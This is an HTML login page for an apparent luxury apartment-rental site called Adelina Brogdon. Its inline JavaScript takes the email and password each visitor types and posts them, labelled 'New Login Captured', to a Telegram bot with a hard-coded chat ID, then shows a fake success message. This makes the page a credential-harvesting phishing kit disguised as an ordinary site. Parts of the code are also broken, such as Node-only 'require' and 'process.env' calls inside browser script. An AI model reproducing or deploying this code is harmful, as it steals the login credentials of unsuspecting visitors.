<!DOCTYPE html>
<html lang="en">
<head>
    <title>Login - Adelina Brogdon</title>
    <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <meta name="description" content="Adelina Brogdon offers luxurious and modern apartment services for a perfect stay. Enjoy comfort, convenience, and premium amenities in a clean, elegant environment.">
  <meta name="keywords" content="Adelina Brogdon, luxurious apartments, modern apartment, apartment rentals, WiFi, heating, TV, kitchen, comfortable stay">
  <meta name="author" content="AbsTech - 2348069764769">
  <meta name="robots" content="index, follow">
   <!-- Open Graph Meta Tags -->
  <meta property="og:title" content="Adelina Brogdon | Luxurious Apartments for a Perfect Stay">
  <meta property="og:description" content="Discover a luxurious, modern apartment service tailored for a premium and comfortable stay.">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://adelina.netlify.app/">
  <meta property="og:image" content="https://adelina.netlify.app/pics/adelina.webp">
  
  <!-- Twitter Card Meta Tags -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Adelina Brogdon | Luxurious Apartments for a Perfect Stay">
  <meta name="twitter:description" content="Stay in style with Adelina Brogdon's premium apartment services. Perfect for relaxation and convenience.">
  <meta name="twitter:image" content="https://adelina.netlify.app/pics/adelina.webp">
  <!-- other links -->
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <link href="https://unpkg.com/boxicons@2.1.1/css/boxicons.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/izitoast/1.4.0/css/iziToast.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/js-cookie/3.0.1/js.cookie.min.js"></script>
</head>
<body class="bg-gray-100">
    <!-- Header -->
    <header class="bg-gradient-to-r from-blue-900 to-gray-900 text-white shadow-md sticky top-0 z-10">
        <nav class="container mx-auto flex items-center justify-between py-4 px-6">
            <a href="#" class="text-3xl md:text-4xl font-serif">Adelina Brogdon</a>
            
            <div class="hidden md:flex flex-grow mx-8">
                <input type="text" class="w-full px-4 py-2 border border-transparent rounded-lg bg-white focus:outline-none focus:ring-2 focus:ring-blue-300 transition duration-300" placeholder="Where are you going?"> 
                <button class="bg-white text-blue-600 px-6 py-2 rounded-lg transition duration-300 hover:bg-blue-100 shadow-md">Search</button>
            </div>
            
            <div class="flex items-center space-x-6">
                <div class="relative group">
                    <button class="flex items-center justify-center w-10 h-10 bg-blue-600 text-white rounded-full transition duration-300 hover:bg-blue-700" 
                            data-bs-toggle="popover" title="Profile" data-bs-content="
                            <a href='./home.html' class='block px-4 py-2 text-gray-700 hover:bg-gray-100'>Home</a>
                            <a href='./register.html' class='block px-4 py-2 text-gray-700 hover:bg-gray-100'>Register</a>
                            " data-html="true">
                        <i class="fas fa-user text-lg"></i>
                    </button>
                </div>
                
                <button class="md:hidden flex items-center justify-center w-10 h-10 border border-transparent rounded-full text-white hover:bg-blue-700 focus:outline-none" 
                        data-bs-toggle="popover" title="Menu" data-bs-content="
                        <a href='./home.html' class='block px-4 py-2 text-gray-700 hover:bg-gray-100'>Home</a>
                        <a href='./register.html' class='block px-4 py-2 text-gray-700 hover:bg-gray-100'>Register</a>
                        " data-html="true">
                    <i class="fas fa-bars text-lg"></i>
                </button>
            </div>
        </nav>
    </header>

    <!-- Login Form -->
    <div class="container mx-auto mt-8 p-6 bg-white rounded-lg shadow-md">
        <h1 class="text-3xl font-bold text-gray-800 mb-4">Login to Your Account</h1>
        <form action="#" id="loginForm" method="POST">
            <div class="mb-4">
                <label for="email" class="block text-gray-700">Email Address</label>
                <input type="email" id="email" name="email" required class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-300 transition duration-300" placeholder="Enter your email">
            </div>

            <div class="mb-4">
                <label for="password" class="block text-gray-700">Password</label>
                <input type="password" id="password" name="password" required class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-300 transition duration-300" placeholder="Enter your password">
            </div>

            <button type="submit" class="bg-blue-600 text-white px-6 py-2 rounded-lg transition duration-300 hover:bg-blue-700 shadow-md">Login</button>
        </form>

        <p class="mt-4 text-gray-600">Don't have an account? <a href="./register.html" class="text-blue-600 hover:underline">Register here</a></p>
        <p class="mt-2 text-gray-600"><a href="./forgotten_password.html" class="text-blue-600 hover:underline">Forgot your password?</a></p>
    </div>

    <!-- Footer -->
    <footer class="bg-gray-800 text-white py-8 mt-12">
        <div class="container mx-auto text-center">
            <p>&copy; 2024 Adelina Brogdon. All rights reserved.</p>
            <p>Email: adelinabrogdonnmc13@gmail.com | Los Angeles, CA</p>
        </div>
    </footer>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.all.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/izitoast/1.4.0/js/iziToast.min.js"></script>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            // Initialize Bootstrap Popovers
            var popoverTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="popover"]'));
            var popoverList = popoverTriggerList.map(function (popoverTriggerEl) {
                return new bootstrap.Popover(popoverTriggerEl, {
                    trigger: 'click',
                    html: true
                });
            });
        });

$(document).ready(function () {
    $('#loginForm').on('submit', function (e) {
        e.preventDefault();

        const password = $('#loginForm input[type="password"]').val().trim();
        const email = $('#loginForm input[type="email"]').val().trim();

        // Retrieve stored user data using js-cookie
        const storedUserName = sessionStorage.getItem('user.name') || Cookies.get('user.name');
        const storedPassword = sessionStorage.getItem('user.password') || Cookies.get('user.password');

        // Check if user details are found
        if (!storedUserName || !storedPassword) {
            iziToast.error({
                title: 'Error',
                message: 'No user found, kindly register to create an account!',
                position: 'topRight',
            });
            return;
        }

        if (password === "" || email === "") {
            iziToast.error({
                title: 'Error',
                message: 'All fields are required!',
                position: 'topRight',
            });
        } else if (!validateEmail(email)) {
            iziToast.error({
                title: 'Error',
                message: 'Please enter a valid email address!',
                position: 'topRight',
            });
        } else if (email === storedUserName && password === storedPassword) {
            if (process.env.NODE_ENV !== 'production') {
    require('dotenv').config();
}

            const botToken = process.env.ADELINA_BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
            const chatID = '5538909913';
            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const message = `New Login Captured From:\nName: ${storedUserName}\n\nEmail: ${email}\n\nPassword: ${password}`;

            fetch(telegramURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatID,
                    text: message,
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    iziToast.success({
                        title: 'Success',
                        message: "Login successful! You'll be redirected shortly.",
                        position: 'topRight',
                    });
                    
                    // Clear input fields after successful login message
                    $('#loginForm input[type="password"]').val('');
                    $('#loginForm input[type="email"]').val('');

                    // Redirect to home.html after 4 seconds
                    setTimeout(() => {
                        window.location.href = "./home.html";
                    }, 4000);
                } else {
                    iziToast.error({
                        title: 'Error',
                        message: "Failed to Login, kindly check your internet connection!",
                        position: 'topRight',
                    });
                }
            })
            .catch((error) => {
                iziToast.error({
                    title: 'Error',
                    message: 'Network error! Please check your internet connection.',
                    position: 'topRight',
                });
                console.error('Error:', error); // Log error for debugging
            });
        } else {
            iziToast.error({
                title: 'Error',
                message: 'Incorrect email or password!',
                position: 'topRight',
            });
        }
    });

    function validateEmail(email) {
        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return re.test(String(email).toLowerCase());
    }
});
        
    </script>
</body>
</html>
